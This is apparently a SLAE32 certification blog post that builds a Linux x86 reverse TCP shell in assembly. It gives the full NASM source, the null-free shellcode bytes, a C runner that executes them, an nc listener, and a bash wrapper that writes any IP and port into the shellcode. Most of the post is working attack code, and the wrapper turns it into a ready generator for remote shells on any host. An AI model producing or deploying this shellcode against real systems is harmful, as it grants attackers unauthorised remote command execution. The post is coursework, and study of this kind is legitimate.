---
layout: page
title: Reverse TCP Shell Assembly x86 Shellcode - SLAE32 Second Exam Assignment
permalink: /reverseshell/
---

## Introduction
Hello Everyone!
This blog post is dedicated to Assignment 2 of the SLAE32 Exam, which is to create a Revese TCP Shell.


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/reverseshell.jpg">
</p>

## Assignment 2 - Creating Reverse TCP Shell

In this assignment, i will relay on previous work i have explained and analyzed regarding the first assignment, which was to create a TCP Bind Shell:
<https://naglinagli.github.io/shellbind/>

There are 3 main instructions provided to us in this assignment:

- [ ] Create a reverse TCP shell shellcode
- [ ] Execute the shell using execve
- [ ] Make the port and ip easy to configure

Inorder to create the Shellcode, there are several Syscalls which should be initialized and configured properly.
As was presented on the course, i will use libemu to analyze a working Reverse TCP Shell payload (Such as the Metasploit one)

Photo representation of Reverse TCP Shell:

<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/reversebindshell.png">
</p>

## Analyzing the Metasploit Reverse TCP Shell Payload.

After we have installed Libemu successfully, we will use it to analyze the MSF Reverse TCP Shell payload, Libemu will proviגe us with graphical overview of the shellcode,which will come in handy during this assignment.

Now, i will use the "sctest" tool within Libemu, which is a tool used for detecting and analyzing shellcode.

* Note: sctest requires input data in form of raw bytes, so we have to convert our shellcode into raw data first. 
First, i will generate our MSF shellcode in raw format, using msfvenom.

```bash
msfvenom -p linux/x86/shell_reverse_tcp -f raw > reverseshell.bin
```
where:
* -p payload
* -f format of generated payloads. For complete list type msfvenom --help-formats

The next step will be to utilize "sctest" on the raw version of the reverse_shell.

```bash
cat reverseshell.bin | ./sctest -vvv -Ss 10000 -G reverse_shellcode.dot
dot reverse_shellcode.dot -T png > reverse_shellcode.png
```
where:
* -v, --verbose : be verbose, can be used multiple times, f.e. -vv
* -S, --stdin : read shellcode/buffer from stdin
* -s INTEGER : max number of steps to run
* -G FILEPATH : save a dot formatted callgraph in filepath
* -T png FILEPATH : Transform the given file into png image.

We will be presented with this graphical presentation by visiting the reverse_shellcode.png

![reverseshelllibemu](/images/reversetcplibemu.png)

As we can infer from the graphical presentation, there are 4 main Syscall stages to assemble when creating Reverse_Shell Shellcode.

- [ ] Create the socket
- [ ] Connect to the specified IP and port
- [ ] Duplicate the file descriptors using dup2
- [ ] Execute /bin/sh via execve

## Creating reverse_shell.nasm

Now, We can create the assembly file going through each main stage.

First, i will find the socketcall Syscall number using the following command:

```bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
```
![socketsyscall](/images/socketsyscall.png)

As we can notice, socketcall Syscall number is 102 in decimal, which is 0x66 on HEX.

Now, we can dive deeper onto the specific network sys commands using net.h which is implementation of the SOCKET network access protocol on linux kernel.

```bash
grep SYS_ /usr/include/linux/net.h
```
![nethsocketcall](/images/nethsocketcall.png)

additonaly, dup2 syscall is 63 in decimal which is 0x3F in HEX as per <https://fedora.juszkiewicz.com.pl/syscalls.html>

Now, we are ready to go with reverse_shell.nasm

**There is detailed explanation on the various commands on my previous assignment - <https://naglinagli.github.io/shellbind/> Which can help figuring out the shellcode creating proccess (i will use same methods, hence i don't want to write the same again.**

## Create the socket

In order to create TCP Socket we need to push the following into the stack (don't forgot to push in reverse order)

1. domain – specifies a communication domain - AF_INET (2)
2. type – specifies the communication semantics - SOCK_STREAM (1)
3. protocol – specifies a particular protocol to be used with the socket - TCP protocol is 6, but we will insert (0).

* **AF_INET** is an address family that is used to designate the type of addresses that your socket can communicate with (in this case, Internet Protocol v4 addresses). 

* SOCK_STREAM means that it is a TCP socket.

* Protocol numbers - <https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml>

All the following comes down to the following code :

```c
; setting up the socket
	xor ebx, ebx    ; zeroing out the ebx register
	mul ebx	       ; zeroing out eax and edx registers

	mov al, 0x66    ; setting eax to the socket_call SYSCALL
	mov bl, 0x01     ; assigning 1 to ebx register (SYS_SOCKET)	 
  
	push edx        ; push 0 to the stack (IPPROTO_IP)
	push ebx        ; push 1 to the stack (SOCK_STREAM)
	push 0x2        ; push 2 to the stack (AF_INET)

	mov ecx, esp    ; keep 1st argument address in ecx
	int 0x80         ; syscall
	mov edi, eax	; saving the file descriptor
```

## Connect to the specified IP and port

In this part we encounter an obstacle, as we want our reverse shell to point to localhost (127.0.0.1), we have to find a way to make the reverse shell shellcode null-byte free, therefore, we can do the following:
set the ecx register to 3.2.2.128
decrement from the register 2.1.1.1
as a result we get 1.0.0.127, which is exactly how we want to push the localhost to the stack (in reverse order).

```c
; Connection
	xor ebx, ebx	; zeroing out ebx register
	mul ebx		; zeroing out eax and edx registers
	mov al, 0x66	
	mov bl, 0x03	; set ebx value to 3, (SYS_CONECT)
	
	mov ecx, 0x03020280	; set ecx register 3.2.2.128
	sub ecx, 0x02020201	; decrement 2.1.1.1
	push ecx		; push localhost (127.0.0.1) NULL-FREE
	push word 0x5C11       ; push the port number (4444)
	push word 0x02	       ; AF_INET syscall
		
	mov ecx, esp    ; keep 1st argument address in ecx.
	push byte 0x10    ; push the address length (addrlen)
	push ecx        ; sockaddr structure
	push edi        ; socketfd (file descriptors)
	mov ecx, esp    ; ecx holds the args array for the syscall
	int 0x80        ; init syscall
```

## Duplicate the file descriptors using dup2

```c
; Redirect the file descriptors using dup2

	pop ebx		; moving the file descriptor from the stack
	xor eax, eax	; zeroing out the eax register
	xor ecx, ecx    ; clearing ecx before using the loop
	mov cl, 0x2     ; setting the loop counter

looper:
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns looper
```
## Execute /bin/sh via execve
```c
; Execute /bin/sh with execve

       xor ebx, ebx
       mul ebx

       ; PUSH //bin/sh (8 bytes)
	push edx	; push nullbyte to the stack
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp
	mov ecx, edx

	mov al, 0xB     ; inserting the hex for SYS_EXECVE Syscall
	int 0x80
```
## Assembling and linking

Now, we have completed writing the reverse_shell.nasm file.

I will Assemble and link it with the following complie.sh bash script:

```c
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'

echo '[+] Printing the Shellcode:'

objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

The shellcode output:

```c
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xdb\xf7\xe3\xb0\x66\xb3\x03\xb9\x80\x02\x02\x03\x81\xe9\x01\x02\x02\x02\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x5b\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xdb\xf7\xe3\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
```

As we can see there are no NULL-BYTES within the shellcode generated.

I will insert the shellcode on the generic shellcode c program runner presented :

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xdb\xf7\xe3\xb0\x66\xb3\x03\xb9\x80\x02\x02\x03\x81\xe9\x01\x02\x02\x02\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x5b\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xdb\xf7\xe3\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"


main()
{

       printf("Shellcode Length:  %d\n", strlen(code));

       int (*ret)() = (int(*)())code;

       ret();

}
```

Creating the executable
```c
gcc shellcode.c -fno-stack-protector -z execstack -o execreverse_shell
```

Running the shellcode:
```c
./execreverse_shell
```
Opening my host to incoming connection:

```c
nc -lvnp 4444
```

![reverse_shell](/images/reverse_shell.png)

And thats about it, we have a running reverse TCP shell executing /bin/sh on port 4444.
The only thing left is to make the port and ip easy to configure.

## Port configuration using bash script wrapper
I have used a bash script to make the port and ip configuration possible.
I had to change my reverse shellcode presented above, instead of the manipulation i have made to avoid the NULL-BYTE, i used a dummy 
```c
push 0x11111111111
```
So i could then replacein the bash script the following "\x11\x11\x11\x11" with the ip provided by the user.

The following image explains the whole proccess of running the shellcode on ip 192.168.1.16 (my Ubuntu host) on port 9999 (as example):

![iport](/images/iport.png)

The bash code snippet is presented below:


```sh
  
#!/bin/bash

# Get the ip address as input
ip_address=$1

ip_1=$(echo $ip_address | awk -F '.' '{print$1}')
ip_2=$(echo $ip_address | awk -F '.' '{print$2}')
ip_3=$(echo $ip_address | awk -F '.' '{print$3}')
ip_4=$(echo $ip_address | awk -F '.' '{print$4}')

ip_hex1=$(echo "obase=16; $ip_1" | bc)
ip_hex2=$(echo "obase=16; $ip_2" | bc)
ip_hex3=$(echo "obase=16; $ip_3" | bc)
ip_hex4=$(echo "obase=16; $ip_4" | bc)

if [ $(echo $ip_hex1 | wc -c) == 2 ]
then
	ip_hex1=$(echo $ip_hex1 | sed 's/^/0/')
fi

if [ $(echo $ip_hex2 | wc -c) == 2 ]
then
	ip_hex2=$(echo $ip_hex2 | sed 's/^/0/')
fi

if [ $(echo $ip_hex3 | wc -c) == 2 ]
then
	ip_hex3=$(echo $ip_hex3 | sed 's/^/0/')
fi

if [ $(echo $ip_hex4 | wc -c) == 2 ]
then
	ip_hex4=$(echo $ip_hex4 | sed 's/^/0/')
fi

echo '[+] The HEX translation of the ip address inserted:'
echo $ip_hex4 $ip_hex3 $ip_hex2 $ip_hex1
# port
port_hex=$(echo "obase=16; $2" | bc | sed 's/.\{2\}$/:&/')
port_hex1=$(echo $port_hex | awk  -F ':' '{print$2}')
port_hex2=$(echo $port_hex | awk  -F ':' '{print$1}')

if [ $(echo $port_hex1 | wc -c) == 2 ]
then
	port_hex1=$(echo $port_hex1 | sed 's/^/0/')
fi

if [ $(echo $port_hex2 | wc -c) == 2 ]
then
	port_hex2=$(echo $port_hex2 | sed 's/^/0/')
fi

echo '[+] The Port translation to hex:'
echo $port_hex1
echo $port_hex2

echo -e '[+] The crafted shellcode:'


shellcode="\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xdb\xf7\xe3\xb0\x66\xb3\x03\x68\x$ip_hex1\x$ip_hex2\x$ip_hex3\x$ip_hex4\x66\x68\x$port_hex2\x$port_hex1\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x5b\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xdb\xf7\xe3\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"





echo $shellcode
```
And that's a wrap!

Thank you very much for sticking around!

## References

* connect syscall - <https://linux.die.net/man/3/connect>
* Previous blogpost - <https://naglinagli.github.io/shellbind/>


## Wrap-Up
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification

<https://www.pentesteracademy.com/course?id=3>

Student ID: SLAE - 1543

All the source code which i have used throughout the assignment is available here:
<https://github.com/NagliNagli/SLAE/tree/master/Reverse_TCP_Shell>

Cheers,
Gal.
